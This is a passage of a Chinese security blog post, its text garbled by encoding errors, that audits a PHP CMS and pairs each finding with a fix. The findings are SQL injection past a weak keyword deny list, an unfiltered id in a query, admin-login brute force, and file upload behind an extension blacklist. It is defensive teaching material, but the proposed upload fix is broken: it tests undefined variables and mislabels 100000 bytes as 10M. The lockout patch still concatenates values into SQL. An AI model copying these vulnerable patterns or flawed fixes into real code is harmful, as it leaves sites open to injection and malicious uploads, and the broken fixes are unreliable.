id="æ¼æ´ç‚¹ä¸‰-3"><a href="#æ¼æ´ç‚¹ä¸‰-3" class="headerlink" title="æ¼æ´ç‚¹ä¸‰"></a><strong>æ¼æ´ç‚¹ä¸‰</strong></h3><h4 id="ä»£ç åˆ†æ-5"><a href="#ä»£ç åˆ†æ-5" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p><code>application\member\controller\Index.php</code>ä¸­çš„<code>finduser</code>æ–¹æ³•</p><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finduser</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;&#x27;</span>;      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;      <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];      <span class="hljs-variable">$deny_str</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;from&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>);      <span class="hljs-variable">$username</span> = str_ireplace(<span class="hljs-variable">$deny_str</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$username</span>);      <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `email` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;      <span class="hljs-variable">$email</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;email&#x27;</span>];      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æŸ¥è¯¢æˆåŠŸ! &#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;çš„é‚®ç®±æ˜¯:&#x27;</span>;<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$email</span>]);      &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æŸ¥è¯¢å¤±è´¥ï¼Œ&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;ä¸å­˜åœ¨,è¯·æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦æ­£ç¡®!&#x27;</span>;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);      &#125;      &#125;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>);  &#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯è¿‡æ»¤çš„å†…å®¹å¾ˆå°‘ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å°±è¢«ç»•è¿‡</p><h4 id="æ¼æ´é˜²å¾¡-6"><a href="#æ¼æ´é˜²å¾¡-6" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p>è¿™é‡Œçš„é˜²å¾¡å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸Šé¢è¿‡æ»¤å‡½æ•°</p><h3 id="æ¼æ´ç‚¹å››-2"><a href="#æ¼æ´ç‚¹å››-2" class="headerlink" title="æ¼æ´ç‚¹å››"></a><strong>æ¼æ´ç‚¹å››</strong></h3><p>ä»£ç ä½ç½®<code>application\member\controller\Content.php</code></p><h4 id="ä»£ç åˆ†æ-6"><a href="#ä»£ç åˆ†æ-6" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-number">0</span>);            <span class="hljs-variable">$info</span> = Db::query(<span class="hljs-string">&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;userid.<span class="hljs-string">&#x27; AND `id` = &#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27; LIMIT 1&#x27;</span>)[<span class="hljs-number">0</span>];            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$info</span>)) &#123;                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;ç¨¿ä»¶ä¸å­˜åœ¨ï¼&#x27;</span>);            &#125;</code></pre><p>è¿™é‡Œç›´æ¥å°†ç”¨æˆ·æäº¤çš„æ•°æ®idï¼Œå¸¦å…¥åˆ°sqlè¯­å¥ä¸­æŸ¥è¯¢ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œè¿‡æ»¤</p><h4 id="æ¼æ´é˜²å¾¡-7"><a href="#æ¼æ´é˜²å¾¡-7" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p><strong>æ–¹æ³•ä¸€</strong></p><p>  å› ä¸ºidæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆç›´æ¥å¯¹idè¿™ä¸ªå‚æ•°è¿›è¡Œé™åˆ¶ï¼Œåªå…è®¸ç”¨æˆ·æäº¤æ•°å­—å‹æ•°æ®</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$id</span>))&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;idå¿…é¡»æ˜¯æ•°å­—ï¼&quot;</span>)&#125;</code></pre><p><strong>æ–¹æ³•äºŒ</strong></p><p>ä¸ä¸Šé¢çš„æ–¹æ³•äºŒä¸€æ ·ï¼Œå¯¹idå‚æ•°è¿›è¡Œè¿‡æ»¤</p><h2 id="6-æš´åŠ›ç ´è§£-1"><a href="#6-æš´åŠ›ç ´è§£-1" class="headerlink" title="6.æš´åŠ›ç ´è§£"></a>6.æš´åŠ›ç ´è§£</h2><h3 id="ä»£ç åˆ†æ-7"><a href="#ä»£ç åˆ†æ-7" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>è¯¥æ¼æ´å­˜åœ¨äºç®¡ç†å‘˜åå°ç™»å½•ï¼Œé€ æˆè¯¥æ¼æ´çš„åŸå› å¤§å¤šæ˜¯å› ä¸ºç®¡ç†äººå‘˜æ²¡æœ‰ä¿®æ”¹åˆå§‹å¯†ç ï¼Œæˆ–è€…å¿ƒå­˜ä¾¥å¹¸æ”¹æˆäº†æ¯”è¾ƒå¸¸è§çš„å¯†ç ï¼Œè¿™æ ·å°±ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œç›´æ¥ä½¿ç”¨æš´åŠ›ç ´è§£å°±å¯ä»¥æ”»å…‹åå°ç®¡ç†é¡µé¢ã€‚</p><p>ä»£ç ä½äº<code>application\admin\controller\Index.php</code>ä¸­çš„<code>login()</code>æ–¹æ³•</p><pre><code class="hljs php"> <span class="hljs-comment">//ç™»å½•åˆ¤æ–­</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"> </span>&#123;     <span class="hljs-variable">$url</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;get(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;index/index&#x27;</span>);     <span class="hljs-keyword">if</span> (User::instance()-&gt;isLogin()) &#123;         <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);     &#125;     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;         <span class="hljs-variable">$data</span>      = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();         <span class="hljs-variable">$keeplogin</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;keeplogin&#x27;</span>);<span class="hljs-comment">// å¯¹æäº¤æ•°æ®è¿›è¡Œæ£€æŸ¥</span>         <span class="hljs-variable">$rule</span> = [             <span class="hljs-string">&#x27;username|ç”¨æˆ·å&#x27;</span> =&gt; <span class="hljs-string">&#x27;require|alphaDash|length:3,20&#x27;</span>,             <span class="hljs-string">&#x27;password|å¯†ç &#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|length:3,20&#x27;</span>,             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,         ];         <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$rule</span>);         <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);         &#125;         <span class="hljs-keyword">if</span> (User::instance()-&gt;login(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;             <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;æ­å–œæ‚¨ï¼Œç™»é™†æˆåŠŸ&#x27;</span>, url(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));         &#125; <span class="hljs-keyword">else</span> &#123;             <span class="hljs-variable">$msg</span> = User::instance()-&gt;getError();             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯!&#x27;</span>;             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);         &#125;     &#125; <span class="hljs-keyword">else</span> &#123;         <span class="hljs-keyword">if</span> (User::instance()-&gt;autologin()) &#123;             <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);         &#125;         <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();     &#125; &#125;</code></pre><p>è™½ç„¶æ¯æ¬¡ç™»å½•éƒ½éœ€è¦å¸¦æœ‰tokenï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºtokençš„å€¼æ˜¯å¯ä»¥ä»å‰ç«¯é¡µé¢è·å–çš„</p><h3 id="æ¼æ´é˜²å¾¡-8"><a href="#æ¼æ´é˜²å¾¡-8" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><p>é˜²å¾¡æ–¹æ³•å°±æ˜¯é™åˆ¶ç®¡ç†å‘˜ç™»å½•æ—¶å¯†ç è¾“å…¥çš„é”™è¯¯æ¬¡æ•°ï¼Œå½“é”™è¯¯æ¬¡æ•°è¾¾åˆ°ä¸€å®šæ•°é‡æ—¶ï¼Œå°±é”å®šè¯¥è´¦å·ï¼Œéœ€è¦æ‹¥æœ‰æ•°æ®åº“ç®¡ç†æƒé™çš„çœŸæ­£ç®¡ç†å‘˜æ‰èƒ½é‡æ–°ç™»å½•ã€‚</p><p>é¦–å…ˆåœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè¡¨<code>yzn_loginfo</code>ï¼Œé‡Œé¢åªéœ€è¦ä¸€ä¸ªå­—æ®µï¼Œç”¨æ¥è®°å½•adminè´¦å·è¿ç»­è¾“å…¥é”™è¯¯å¯†ç çš„æ¬¡æ•°ã€‚</p><p>å…·ä½“æ–¹æ³•ä¸º</p><p>é¦–å…ˆè¿›å…¥mysqlå®¹å™¨å†…éƒ¨</p><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec -it ed<span class="hljs-number">1</span>c<span class="hljs-number">19</span>bb<span class="hljs-number">4</span>a<span class="hljs-number">95</span> bash</code></pre><p>ä¹‹åç™»å½•rootè´¦å·ï¼Œåœ¨æ•°æ®åº“ä¸­å»ºç«‹ä¸€å¼ è¡¨</p><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `yzn_loginfo` (  `login_fail` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>MyISAM <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408102912089.png" alt="image-20210408102912089"></p><p>ä¿®æ”¹ä»£ç <code>application\admin\controller\Index.php</code>ä¸­çš„<code>login()</code>æ–¹æ³•</p><p>å…¶ä¸­æˆ´// æ˜¯å¢åŠ çš„ä»£ç </p><pre><code class="hljs php"><span class="hljs-comment">// ä»yzn_loginfoè¡¨ä¸­è·å–åˆ° login_failçš„å€¼</span><span class="hljs-variable">$login_fail</span> = Db::query(<span class="hljs-string">&#x27;SELECT * FROM `yzn_loginfo`&#x27;</span>)[<span class="hljs-number">0</span>]; <span class="hljs-comment">//</span>         <span class="hljs-variable">$login_fail_count</span> = <span class="hljs-variable">$login_fail</span>[<span class="hljs-string">&#x27;login_fail&#x27;</span>];     <span class="hljs-comment">// </span><span class="hljs-comment">// å¦‚æœå¯†ç é”™è¯¯è¶…è¿‡ 5 åˆ™é”å®šè´¦å·</span>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$login_fail_count</span> &gt;= <span class="hljs-number">5</span>)&#123;                        <span class="hljs-comment">//</span>             <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è´¦å·è¢«é”å®šï¼Œè¯·è”ç³»ç½‘ç«™ç®¡ç†å‘˜ï¼&quot;</span>; <span class="hljs-comment">//</span>             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>,<span class="hljs-variable">$url</span>);   <span class="hljs-comment">//</span>         &#125;         <span class="hljs-keyword">if</span> (User::instance()-&gt;login(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;          <span class="hljs-comment">// å¦‚æœè¾“å…¥çš„å¯†ç æ­£ç¡®ï¼Œè¯´æ˜æ˜¯çœŸæ­£çš„adminï¼Œå°†login_failå€¼æ›´æ–°ä¸º0</span>             Db::query(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>); <span class="hljs-comment">// </span>             <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;æ­å–œæ‚¨ï¼Œç™»é™†æˆåŠŸ&#x27;</span>, url(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));         &#125; <span class="hljs-keyword">else</span> &#123;             <span class="hljs-variable">$msg</span> = User::instance()-&gt;getError();             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯!&#x27;</span>;             <span class="hljs-comment">// å¦‚æœè¾“å…¥çš„å¯†ç ä¸æ­£ç¡®ï¼Œåˆ™å°†login_failçš„å€¼+1åå†åˆ°æ•°æ®åº“ä¸­æ›´æ–°</span>             <span class="hljs-variable">$login_fail_count_new</span> = <span class="hljs-variable">$login_fail_count</span> + <span class="hljs-number">1</span>;  <span class="hljs-comment">//</span>             Db::query(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;</span>.<span class="hljs-variable">$login_fail_count_new</span>.<span class="hljs-string">&#x27; WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>);  <span class="hljs-comment">//</span>             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);         &#125;</code></pre><p>å½“è¿ç»­è¾“é”™äº”æ¬¡å¯†ç æ—¶ï¼Œè´¦å·å°±è¢«é”å®šï¼Œæ­¤æ—¶æ²¡æœ‰ä»»ä½•äººèƒ½å¤Ÿç™»å½•ï¼Œå¿…é¡»åˆ°æ•°æ®åº“ä¸­éœ€æ”¹<code>yzn_loginfo</code>çš„<code>login_fail</code>çš„å€¼ï¼Œè¿™ä¹Ÿå°±è¾¾åˆ°äº†é˜²æ­¢æš´åŠ›ç ´è§£çš„æ”»å‡»ã€‚</p><p>å³æ‰§è¡Œä¸‹é¢è¿™ä¸ªsqlè¯­å¥</p><pre><code class="hljs n1ql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-symbol">`yzn_loginfo`</span> <span class="hljs-keyword">SET</span> <span class="hljs-symbol">`login_fail`</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-symbol">`login_fail`</span>= <span class="hljs-number">5</span>;</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408104728600.png" alt="image-20210408104728600"></p><h2 id="7-æ–‡ä»¶ä¸Šä¼ "><a href="#7-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="7.æ–‡ä»¶ä¸Šä¼ "></a>7.æ–‡ä»¶ä¸Šä¼ </h2><h3 id="æ¼æ´ç‚¹ä¸€-6"><a href="#æ¼æ´ç‚¹ä¸€-6" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a><strong>æ¼æ´ç‚¹ä¸€</strong></h3><h4 id="ä»£ç åˆ†æ-8"><a href="#ä»£ç åˆ†æ-8" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p><code>application\member\controller\Index.php</code> ä¸­çš„photoæ–¹æ³•</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;     <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);              <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);     <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);      <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];      <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;      <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ æˆåŠŸï¼&#x27;</span>;       &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;       &#125;            &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;    &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢æ˜¯ä½¿ç”¨é»‘åå•ï¼Œå¯¹å«æœ‰é»‘åå•åç¼€çš„æ–‡ä»¶è¿›è¡Œæ›¿æ¢ï¼Œæ˜¾ç¤ºè¿™æ ·æ˜¯å¾ˆä¸å®‰å…¨çš„ï¼Œä½¿ç”¨åŒå†™å³å¯ç»•è¿‡ï¼Œé€ æˆäº†æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><h4 id="æ¼æ´é˜²å¾¡-9"><a href="#æ¼æ´é˜²å¾¡-9" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;      <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;      define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;      <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$uploaded_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);  <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];  <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];          <span class="hljs-comment">//æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¿®å¤ </span>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$uploaded_name</span>;  <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;gif&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp; getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) &amp;&amp; ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/gif&#x27;</span> )             ) &#123;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ æˆåŠŸï¼&#x27;</span>;           &#125; <span class="hljs-keyword">else</span> &#123;                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®&quot;</span>)  &#125;               &#125; <span class="hljs-keyword">else</span> &#123;          <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;      &#125;      &#125;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);  &#125;</code></pre><p>å…¶ä¸­ifä¸­çš„æ¡ä»¶å¦‚ä¸‹</p><ul><li><p><code>( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; )</code></p><p>ä¿è¯æ–‡ä»¶åç¼€ååªèƒ½æ˜¯<code>jpg gif png</code>çš„ä¸€ä¸ª</p></li><li><p><code>( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; )</code></p><p>æ–‡ä»¶çš„MIMEå¿…é¡»ä¸ºä¸‰è€…ä¸­çš„ä¸€ä¸ª</p></li><li><p><code>( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp )</code></p><p>è¿™æ˜¯ä¿è¯æ–‡ä»¶çš„å¤§å°å°10Mï¼Œå¹¶ä¸”æ–‡ä»¶ä¸èƒ½ç©º</p></li></ul><h3 id="æ¼æ´ç‚¹äºŒ-6"><a href="#æ¼æ´ç‚¹äºŒ-6" 